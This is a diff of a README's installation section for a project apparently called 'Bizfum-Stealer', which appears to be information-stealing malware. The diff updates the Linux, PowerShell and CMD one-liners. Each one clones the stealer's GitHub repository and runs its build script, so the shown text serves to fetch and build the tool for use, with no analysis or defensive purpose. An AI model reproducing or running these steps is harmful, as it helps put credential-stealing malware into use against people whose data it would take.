@@ -19,14 +19,17 @@
 ## Installation
 The installation process is straightforward. Clone the repository and choose the desired version, as indicated in the repository structure. For instance, to install the version with debug information:
 
-**Bash**
+**Linux**
 ```bash
 git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git && cd Bizfum-Stealer/debug-version && chmod +x build.sh && ./build.sh
 ```
 
-**PowerShell**
+**CMD / POWERSHELL**
 ```powershell
-git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git; cd Bizfum-Stealer/debug-version; Start-Process "build.bat"
+git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git; cd Bizfum-Stealer; Start-Process "build.bat"
+```
+```cmd
+git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git && cd Bizfum-Stealer && .\build.bat
 ```
 
 ## Purpose
